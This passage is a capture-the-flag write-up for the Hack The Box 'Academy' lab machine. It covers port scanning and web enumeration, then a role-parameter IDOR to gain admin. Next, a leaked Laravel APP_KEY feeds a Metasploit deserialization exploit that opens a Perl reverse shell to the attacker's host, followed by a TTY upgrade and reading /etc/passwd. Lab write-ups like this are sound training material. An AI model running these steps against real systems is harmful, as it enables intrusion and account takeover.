</span></span><span class=line><span class=cl>SF-Port33060-TCP:V=7.91%I=7%D=2/2%Time=6019928E%P=x86_64-unknown-linux-gnu
</span></span><span class=line><span class=cl>SF:%r(NULL,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(GenericLines,9,&#34;\x05\0\0\0\
</span></span><span class=line><span class=cl>SF:x0b\x08\x05\x1a\0&#34;)%r(GetRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(HT
</span></span><span class=line><span class=cl>SF:TPOptions,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(RTSPRequest,9,&#34;\x05\0\0\0
</span></span><span class=line><span class=cl>SF:\x0b\x08\x05\x1a\0&#34;)%r(RPCCheck,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(DNS
</span></span><span class=line><span class=cl>SF:VersionBindReqTCP,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(DNSStatusRequestT
</span></span><span class=line><span class=cl>SF:CP,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\
</span></span><span class=line><span class=cl>SF:x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(Help,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a
</span></span><span class=line><span class=cl>SF:\0&#34;)%r(SSLSessionReq,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
</span></span><span class=line><span class=cl>SF:\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(TerminalServerCo
</span></span><span class=line><span class=cl>SF:okie,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(TLSSessionReq,2B,&#34;\x05\0\0\0\x
</span></span><span class=line><span class=cl>SF:0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20messa
</span></span><span class=line><span class=cl>SF:ge\&#34;\x05HY000&#34;)%r(Kerberos,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(SMBProgN
</span></span><span class=line><span class=cl>SF:eg,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(X11Probe,2B,&#34;\x05\0\0\0\x0b\x08\
</span></span><span class=line><span class=cl>SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;\x0
</span></span><span class=line><span class=cl>SF:5HY000&#34;)%r(FourOhFourRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(LPDStr
</span></span><span class=line><span class=cl>SF:ing,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(LDAPSearchReq,2B,&#34;\x05\0\0\0\x0
</span></span><span class=line><span class=cl>SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20messag
</span></span><span class=line><span class=cl>SF:e\&#34;\x05HY000&#34;)%r(LDAPBindReq,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(SIPOpt
</span></span><span class=line><span class=cl>SF:ions,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(LANDesk-RC,9,&#34;\x05\0\0\0\x0b\x
</span></span><span class=line><span class=cl>SF:08\x05\x1a\0&#34;)%r(TerminalServer,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(NCP
</span></span><span class=line><span class=cl>SF:,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(NotesRPC,2B,&#34;\x05\0\0\0\x0b\x08\x0
</span></span><span class=line><span class=cl>SF:5\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;\x05H
</span></span><span class=line><span class=cl>SF:Y000&#34;)%r(JavaRMI,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(WMSRequest,9,&#34;\x05
</span></span><span class=line><span class=cl>SF:\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(oracle-tns,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0
</span></span><span class=line><span class=cl>SF:&#34;)%r(ms-sql-s,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(afp,2B,&#34;\x05\0\0\0\x0
</span></span><span class=line><span class=cl>SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20messag
</span></span><span class=line><span class=cl>SF:e\&#34;\x05HY000&#34;)%r(giop,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;);
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Tue Feb  2 18:57:52 2021 -- 1 IP address (1 host up) scanned in 43.69 seconds
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts | grep academy
</span></span><span class=line><span class=cl>10.10.10.215 academy.htb
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s start with the web port but let&rsquo;s keep in mind that we have a weird 33060
port.</p><h2 id=web-enumeration>Web enumeration<a hidden class=anchor aria-hidden=true href=#web-enumeration>#</a></h2><p>We can register and login at <a href=http://academy.htb/>http://academy.htb/</a>. But there is not much to
see there.</p><p>So let&rsquo;s enumerate with ffuf:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ffuf -u http://academy.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt -fc 403
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span><span class=line><span class=cl>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span><span class=line><span class=cl>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span><span class=line><span class=cl>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span><span class=line><span class=cl>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span><span class=line><span class=cl>          \/_/    \/_/   \/___/    \/_/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       v1.2.0-git
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> :: Method           : GET
</span></span><span class=line><span class=cl> :: URL              : http://academy.htb/FUZZ
</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt
</span></span><span class=line><span class=cl> :: Follow redirects : false
</span></span><span class=line><span class=cl> :: Calibration      : false
</span></span><span class=line><span class=cl> :: Timeout          : 10
</span></span><span class=line><span class=cl> :: Threads          : 40
</span></span><span class=line><span class=cl> :: Matcher          : Response status: 200,204,301,302,307,401,403
</span></span><span class=line><span class=cl> :: Filter           : Response status: 403
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>index.php               [Status: 200, Size: 2117, Words: 890, Lines: 77]
</span></span><span class=line><span class=cl>register.php            [Status: 200, Size: 3003, Words: 801, Lines: 149]
</span></span><span class=line><span class=cl>login.php               [Status: 200, Size: 2627, Words: 667, Lines: 142]
</span></span><span class=line><span class=cl>admin.php               [Status: 200, Size: 2633, Words: 668, Lines: 142]
</span></span><span class=line><span class=cl>config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
</span></span><span class=line><span class=cl>home.php                [Status: 302, Size: 55034, Words: 4001, Lines: 1050]
</span></span><span class=line><span class=cl>.                       [Status: 200, Size: 2117, Words: 890, Lines: 77]
</span></span><span class=line><span class=cl>:: Progress: [10848/10848] :: Job [1/1] :: 1294 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
</span></span></code></pre></td></tr></table></div></div><p>We notice there is an admin page.</p><h2 id=web-exploitation-idor>Web exploitation: IDOR<a hidden class=anchor aria-hidden=true href=#web-exploitation-idor>#</a></h2><p>When registering there is a param <code>roleid</code>, if we change it from zero (user) to
one (admin), we will maybe get an admin account.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /register.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: academy.htb
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 50
</span></span><span class=line><span class=cl>Origin: http://academy.htb
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Referer: http://academy.htb/register.php
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=p9e8usvnv8b6jd47873fbt4ao2
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>uid=cyfun3&amp;password=cyfun3&amp;confirm=cyfun3&amp;roleid=0
</span></span></code></pre></td></tr></table></div></div><p>Then we can login at <a href=http://academy.htb/admin.php>http://academy.htb/admin.php</a>. If you let <code>roleid=0</code> you can&rsquo;t.</p><p>On the admin dashboard there is a todolist with a status.</p><table><thead><tr><th>Item</th><th>Status</th></tr></thead><tbody><tr><td>Complete initial set of modules (cry0l1t3 / mrb3n)</td><td>done</td></tr><tr><td>Finalize website design</td><td>done</td></tr><tr><td>Test all modules</td><td>done</td></tr><tr><td>Prepare launch campaign</td><td>done</td></tr><tr><td>Separate student and admin roles</td><td>done</td></tr><tr><td>Fix issue with dev-staging-01.academy.htb</td><td>pending</td></tr></tbody></table><p>Let&rsquo;s add the new subdomain to our host file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts | grep academy
</span></span><span class=line><span class=cl>10.10.10.215 academy.htb
</span></span><span class=line><span class=cl>10.10.10.215 dev-staging-01.academy.htb
</span></span></code></pre></td></tr></table></div></div><h2 id=web-exploitation-laravel-rce-and-debug-mode>Web exploitation: Laravel RCE and debug mode<a hidden class=anchor aria-hidden=true href=#web-exploitation-laravel-rce-and-debug-mode>#</a></h2><p>Let&rsquo;s go at: <a href=http://dev-staging-01.academy.htb/>http://dev-staging-01.academy.htb/</a></p><p>We are welcomed by a laravel debugger.</p><p>Here we have a bunch of environment variables leaking secrets:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>APP_NAME &#34;Laravel&#34;
</span></span><span class=line><span class=cl>APP_ENV &#34;local&#34;
</span></span><span class=line><span class=cl>APP_KEY &#34;base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=&#34;
</span></span><span class=line><span class=cl>APP_DEBUG &#34;true&#34;
</span></span><span class=line><span class=cl>APP_URL &#34;http://localhost&#34;
</span></span><span class=line><span class=cl>LOG_CHANNEL &#34;stack&#34;
</span></span><span class=line><span class=cl>DB_CONNECTION &#34;mysql&#34;
</span></span><span class=line><span class=cl>DB_HOST &#34;127.0.0.1&#34;
</span></span><span class=line><span class=cl>DB_PORT &#34;3306&#34;
</span></span><span class=line><span class=cl>DB_DATABASE &#34;homestead&#34;
</span></span><span class=line><span class=cl>DB_USERNAME &#34;homestead&#34;
</span></span><span class=line><span class=cl>DB_PASSWORD &#34;secret&#34;
</span></span><span class=line><span class=cl>BROADCAST_DRIVER &#34;log&#34;
</span></span><span class=line><span class=cl>CACHE_DRIVER &#34;file&#34;
</span></span><span class=line><span class=cl>SESSION_DRIVER &#34;file&#34;
</span></span><span class=line><span class=cl>SESSION_LIFETIME &#34;120&#34;
</span></span><span class=line><span class=cl>QUEUE_DRIVER &#34;sync&#34;
</span></span><span class=line><span class=cl>REDIS_HOST &#34;127.0.0.1&#34;
</span></span><span class=line><span class=cl>REDIS_PASSWORD &#34;null&#34;
</span></span><span class=line><span class=cl>REDIS_PORT &#34;6379&#34;
</span></span><span class=line><span class=cl>MAIL_DRIVER &#34;smtp&#34;
</span></span><span class=line><span class=cl>MAIL_HOST &#34;smtp.mailtrap.io&#34;
</span></span><span class=line><span class=cl>MAIL_PORT &#34;2525&#34;
</span></span><span class=line><span class=cl>MAIL_USERNAME &#34;null&#34;
</span></span><span class=line><span class=cl>MAIL_PASSWORD &#34;null&#34;
</span></span><span class=line><span class=cl>MAIL_ENCRYPTION &#34;null&#34;
</span></span><span class=line><span class=cl>PUSHER_APP_ID &#34;&#34;
</span></span><span class=line><span class=cl>PUSHER_APP_KEY &#34;&#34;
</span></span><span class=line><span class=cl>PUSHER_APP_SECRET &#34;&#34;
</span></span><span class=line><span class=cl>PUSHER_APP_CLUSTER &#34;mt1&#34;
</span></span><span class=line><span class=cl>MIX_PUSHER_APP_KEY &#34;&#34;
</span></span><span class=line><span class=cl>MIX_PUSHER_APP_CLUSTER &#34;mt1&#34;
</span></span></code></pre></td></tr></table></div></div><p>By searching for <code>laravel api key exploit</code> I found this
<a href=https://www.exploit-db.com/exploits/47129>metasploit exploit</a>.</p><p>The RCE exploit requires the APP_KEY but we just get it through the leak.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>msf6</span> <span class=n>exploit</span><span class=p>(</span><span class=n>unix</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>laravel_token_unserialize_exec</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>options</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Module</span> <span class=n>options</span> <span class=p>(</span><span class=n>exploit</span><span class=o>/</span><span class=n>unix</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>laravel_token_unserialize_exec</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=n>Name</span>       <span class=n>Current</span> <span class=n>Setting</span>                               <span class=n>Required</span>  <span class=n>Description</span>
</span></span><span class=line><span class=cl>   <span class=o>----</span>       <span class=o>---------------</span>                               <span class=o>--------</span>  <span class=o>-----------</span>
</span></span><span class=line><span class=cl>   <span class=n>APP_KEY</span>    <span class=n>dBLUaMuZz7Iq06XtL</span><span class=o>/</span><span class=n>Xnz</span><span class=o>/</span><span class=mi>90</span><span class=n>Ejq</span><span class=o>+</span><span class=n>DEEynggqubHWFj0</span><span class=o>=</span>  <span class=n>no</span>        <span class=n>The</span> <span class=n>base64</span> <span class=n>encoded</span> <span class=n>APP_KEY</span> <span class=n>string</span> <span class=n>from</span> <span class=n>the</span> <span class=o>.</span><span class=n>env</span> <span class=n>file</span>
</span></span><span class=line><span class=cl>   <span class=n>Proxies</span>                                                  <span class=n>no</span>        <span class=n>A</span> <span class=n>proxy</span> <span class=n>chain</span> <span class=n>of</span> <span class=n>format</span> <span class=n>type</span><span class=p>:</span><span class=n>host</span><span class=p>:</span><span class=n>port</span><span class=p>[,</span><span class=n>type</span><span class=p>:</span><span class=n>host</span><span class=p>:</span><span class=n>port</span><span class=p>][</span><span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl>   <span class=n>RHOSTS</span>     <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.215</span>                                  <span class=n>yes</span>       <span class=n>The</span> <span class=n>target</span> <span class=n>host</span><span class=p>(</span><span class=n>s</span><span class=p>),</span> <span class=nb>range</span> <span class=n>CIDR</span> <span class=n>identifier</span><span class=p>,</span> <span class=ow>or</span> <span class=n>hosts</span> <span class=n>file</span> <span class=n>with</span> <span class=n>syntax</span> <span class=s1>&#39;file:&lt;path&gt;&#39;</span>
</span></span><span class=line><span class=cl>   <span class=n>RPORT</span>      <span class=mi>80</span>                                            <span class=n>yes</span>       <span class=n>The</span> <span class=n>target</span> <span class=n>port</span> <span class=p>(</span><span class=n>TCP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=n>SSL</span>        <span class=bp>false</span>                                         <span class=n>no</span>        <span class=n>Negotiate</span> <span class=n>SSL</span><span class=o>/</span><span class=n>TLS</span> <span class=k>for</span> <span class=n>outgoing</span> <span class=n>connections</span>
</span></span><span class=line><span class=cl>   <span class=n>TARGETURI</span>  <span class=o>/</span>                                             <span class=n>yes</span>       <span class=ne>Path</span> <span class=n>to</span> <span class=n>target</span> <span class=n>webapp</span>
</span></span><span class=line><span class=cl>   <span class=n>VHOST</span>      <span class=n>dev</span><span class=o>-</span><span class=n>staging</span><span class=o>-</span><span class=mf>01.</span><span class=n>academy</span><span class=o>.</span><span class=n>htb</span>                    <span class=n>no</span>        <span class=n>HTTP</span> <span class=n>server</span> <span class=n>virtual</span> <span class=n>host</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Payload</span> <span class=n>options</span> <span class=p>(</span><span class=n>cmd</span><span class=o>/</span><span class=n>unix</span><span class=o>/</span><span class=n>reverse_perl</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=n>Name</span>   <span class=n>Current</span> <span class=n>Setting</span>  <span class=n>Required</span>  <span class=n>Description</span>
</span></span><span class=line><span class=cl>   <span class=o>----</span>   <span class=o>---------------</span>  <span class=o>--------</span>  <span class=o>-----------</span>
</span></span><span class=line><span class=cl>   <span class=n>LHOST</span>  <span class=mf>10.10</span><span class=o>.</span><span class=mf>14.115</span>     <span class=n>yes</span>       <span class=n>The</span> <span class=n>listen</span> <span class=n>address</span> <span class=p>(</span><span class=n>an</span> <span class=n>interface</span> <span class=n>may</span> <span class=n>be</span> <span class=n>specified</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=n>LPORT</span>  <span class=mi>4444</span>             <span class=n>yes</span>       <span class=n>The</span> <span class=n>listen</span> <span class=n>port</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Exploit</span> <span class=n>target</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=n>Id</span>  <span class=n>Name</span>
</span></span><span class=line><span class=cl>   <span class=o>--</span>  <span class=o>----</span>
</span></span><span class=line><span class=cl>   <span class=mi>0</span>   <span class=n>Automatic</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>msf6</span> <span class=n>exploit</span><span class=p>(</span><span class=n>unix</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>laravel_token_unserialize_exec</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>run</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Started</span> <span class=n>reverse</span> <span class=n>TCP</span> <span class=n>handler</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>14.115</span><span class=p>:</span><span class=mi>4444</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Command</span> <span class=n>shell</span> <span class=n>session</span> <span class=mi>3</span> <span class=n>opened</span> <span class=p>(</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>14.115</span><span class=p>:</span><span class=mi>4444</span> <span class=o>-&gt;</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.215</span><span class=p>:</span><span class=mi>44738</span><span class=p>)</span> <span class=n>at</span> <span class=mi>2021</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>19</span><span class=p>:</span><span class=mi>57</span><span class=p>:</span><span class=mi>43</span> <span class=o>+</span><span class=mi>0100</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Command</span> <span class=n>shell</span> <span class=n>session</span> <span class=mi>4</span> <span class=n>opened</span> <span class=p>(</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>14.115</span><span class=p>:</span><span class=mi>4444</span> <span class=o>-&gt;</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.215</span><span class=p>:</span><span class=mi>44740</span><span class=p>)</span> <span class=n>at</span> <span class=mi>2021</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>19</span><span class=p>:</span><span class=mi>57</span><span class=p>:</span><span class=mi>44</span> <span class=o>+</span><span class=mi>0100</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>id</span>
</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-www-data-to-cry0l1t3>Privilege Escalation of Machine : from www-data to cry0l1t3<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-www-data-to-cry0l1t3>#</a></h2><p>First let&rsquo;s get a <a href=https://book.hacktricks.xyz/shells/shells/full-ttys>full TTY</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>python3</span> <span class=o>-</span><span class=n>c</span> <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=n>inside</span> <span class=n>the</span> <span class=n>nc</span> <span class=n>session</span><span class=p>)</span> <span class=n>CTRL</span><span class=o>+</span><span class=n>Z</span><span class=p>;</span><span class=n>stty</span> <span class=n>raw</span> <span class=o>-</span><span class=n>echo</span><span class=p>;</span> <span class=n>fg</span><span class=p>;</span> <span class=n>ls</span><span class=p>;</span> <span class=k>export</span> <span class=n>SHELL</span><span class=o>=/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span><span class=p>;</span> <span class=k>export</span> <span class=n>TERM</span><span class=o>=</span><span class=n>screen</span><span class=p>;</span> <span class=n>stty</span> <span class=n>rows</span> <span class=mi>38</span> <span class=n>columns</span> <span class=mi>116</span><span class=p>;</span> <span class=n>reset</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>There are plenty users we could target:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>academy</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>htb</span><span class=o>-</span><span class=n>academy</span><span class=o>-</span><span class=n>dev</span><span class=o>-</span><span class=mi>01</span><span class=o>/</span><span class=n>public</span><span class=o>$</span> <span class=n>cat</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span>
</span></span><span class=line><span class=cl><span class=n>root</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=n>egre55</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=n>egre55</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>egre55</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>lxd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>998</span><span class=p>:</span><span class=mi>100</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>snap</span><span class=o>/</span><span class=n>lxd</span><span class=o>/</span><span class=n>common</span><span class=o>/</span><span class=n>lxd</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>mrb3n</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1001</span><span class=p>:</span><span class=mi>1001</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>mrb3n</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span>
